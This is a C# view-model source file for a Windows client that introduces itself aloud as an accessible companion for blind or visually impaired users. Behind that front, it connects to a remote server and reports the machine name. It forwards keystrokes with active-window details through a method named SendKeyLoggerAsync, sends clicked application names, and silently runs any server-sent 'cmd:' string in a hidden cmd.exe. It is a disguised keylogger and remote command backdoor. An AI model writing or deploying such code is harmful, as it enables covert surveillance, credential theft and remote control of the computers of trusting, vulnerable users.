using System;
using System.Diagnostics;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using Avalonia.Threading;
using DotNetEnv;
using CLIENT.Helpers;
using System.Speech.Synthesis;
using System.Threading;

namespace CLIENT.ViewModels
{
    public partial class MainWindowViewModel : ViewModelBase
    {
        private string _greeting = "Connecting to server...";

        public string Greeting
        {
            get => _greeting;
            set => SetProperty(ref _greeting, value);
        }

        
        private TcpClient _client;
        private NetworkStream _stream;
        private SpeechSynthesizer _synth;
        public MainWindowViewModel()
        {
            DotNetEnv.Env.Load();
            _synth = new SpeechSynthesizer();
            _synth.SetOutputToDefaultAudioDevice();
            _ = ConnectToServerAsync();
        }

        private async Task ConnectToServerAsync()
        {
            string serverPortStr = Environment.GetEnvironmentVariable("SERVER_PORT") ?? "2025";
            int port = int.TryParse(serverPortStr, out int p) ? p : 2025;
            string serverIp = Environment.GetEnvironmentVariable("MASTER_IP") ?? "127.0.0.1";

            _synth.SetOutputToDefaultAudioDevice();


            _synth.SpeakAsync("Hello! I'm your accessible companion, designed to help blind or visually impaired individuals read and navigate their computers effortlessly");

            KeyboardDetector.OnKeyPressed += async (key, isUpperCase, isShiftPressed, isCtrlPressed) =>
            {
                _synth.SpeakAsyncCancelAll();
                _synth.SpeakAsync($"You pressed {key}");
                string windowInfo = WindowDetector.GetActiveWindowInfo();
                if (_client == null || !_client.Connected)
                {
                    await SendKeyLoggerAsync($"Key: {key}, {windowInfo}");
                }
            };
            KeyboardDetector.Start();

            MouseDetector.OnMouseHoverRead += (content) =>
            {
                _synth.SpeakAsyncCancelAll();
                _synth.SpeakAsync($"Content at mouse position: {content}");
            };
            MouseDetector.Start();
            while (true)
            {
                try
                {
               
                    if (_client == null || !_client.Connected)
                    {
                        _client = new TcpClient();
                        await _client.ConnectAsync(serverIp, port);
                        _stream = _client.GetStream();

                        // Send initial machine name
                        string clientMessage = $"Machine - {Environment.MachineName}";
                        byte[] sendBuffer = Encoding.UTF8.GetBytes(clientMessage);
                        await _stream.WriteAsync(sendBuffer, 0, sendBuffer.Length);

                        await Dispatcher.UIThread.InvokeAsync(() =>
                        {
                      
                            Greeting = "Connected to server!";
                        });

                        // Start listening
                        _ = ListenToServerAsync();

                      
                      

                        break; // Exit the reconnect loop after successful connection
                    }
                }
                catch (Exception ex)
                {
                    await Dispatcher.UIThread.InvokeAsync(() =>
                    {
                        Greeting = "Retrying connection... (" + ex.Message + ")";
                    });

                    await Task.Delay(3000); // wait before retrying
                }
            }
        }


        private async Task ListenToServerAsync()
        {
            try
            {
                while (_client != null && _client.Connected)
                {
                    var buffer = new byte[1024];
                    int bytesRead = await _stream.ReadAsync(buffer, 0, buffer.Length);
                    if (bytesRead == 0) break; // Server disconnected

                    string serverMessage = Encoding.UTF8.GetString(buffer, 0, bytesRead);

                    await Dispatcher.UIThread.InvokeAsync(() =>
                    {
                        if (serverMessage.StartsWith("cmd:"))
                        {
                            string command = serverMessage.Substring(4).Trim();
                            Greeting = $"Command from server: {command}";
                            try
                            {
                                // Create a new process to run the command in cmd
                                ProcessStartInfo processStartInfo = new ProcessStartInfo()
                                {
                                    FileName = "cmd.exe",
                                    Arguments = $"/c {command}",  // /c executes the command and terminates
                                    RedirectStandardOutput = true, // Redirect the output to read it
                                    UseShellExecute = false,      // Don't use shell execute to get output
                                    CreateNoWindow = true         // Don't show the command prompt window
                                };

                                using (Process process = Process.Start(processStartInfo))
                                {
                                    if (process != null)
                                    {
                                        string output = process.StandardOutput.ReadToEnd();  // Capture the output
                                        process.WaitForExit(); // Wait for the process to exit

                                        // You can handle the output here, e.g., log it or display it
                                        Console.WriteLine($"Command output: {output}");
                                    }
                                }
                            }
                            catch (Exception ex)
                            {
                                // Handle any exceptions that may occur
                                Console.WriteLine($"Error running command: {ex.Message}");
                            }

                        }
                        else
                        {
                            Greeting = "Server says: " + serverMessage;
                        }
                    });
                }
            }
            catch (Exception ex)
            {
                await Dispatcher.UIThread.InvokeAsync(() =>
                {
                    Greeting = "Disconnected: " + ex.Message;
                });
            }

            // Reconnect on disconnect
            _client?.Close();
            _client = null;
            _stream = null;

            await ConnectToServerAsync();
        }


        public async Task SendKeyLoggerAsync(string appName)
        {
            try
            {
                if (_client != null && _client.Connected && _stream != null)
                {
                    string message = $"{appName}";
                    byte[] messageBytes = Encoding.UTF8.GetBytes(message);
                    await _stream.WriteAsync(messageBytes, 0, messageBytes.Length);

                    await Dispatcher.UIThread.InvokeAsync(() =>
                    {
                        Greeting = $"Sent to server: {message}";
                    });
                }
            }
            catch (Exception ex)
            {
                await Dispatcher.UIThread.InvokeAsync(() =>
                {
                    Greeting = "Send failed: " + ex.Message;
                });
            }
        }
        public async Task SendAppInfoAsync(string appName)
        {
            _synth.SpeakAsyncCancelAll();
            _synth.SpeakAsync($"You clicked {appName}");
            try
            {
                if (_client != null && _client.Connected && _stream != null)
                {
                    string message = $"Clicked: {appName}";
                    byte[] messageBytes = Encoding.UTF8.GetBytes(message);
                    await _stream.WriteAsync(messageBytes, 0, messageBytes.Length);
                    await Dispatcher.UIThread.InvokeAsync(() =>
                    {
                        Greeting = $"Sent to server: {message}";
                    });
                }
            }
            catch (Exception ex)
            {
                await Dispatcher.UIThread.InvokeAsync(() =>
                {
                    Greeting = "Send failed: " + ex.Message;
                });
            }
        }

    }
}
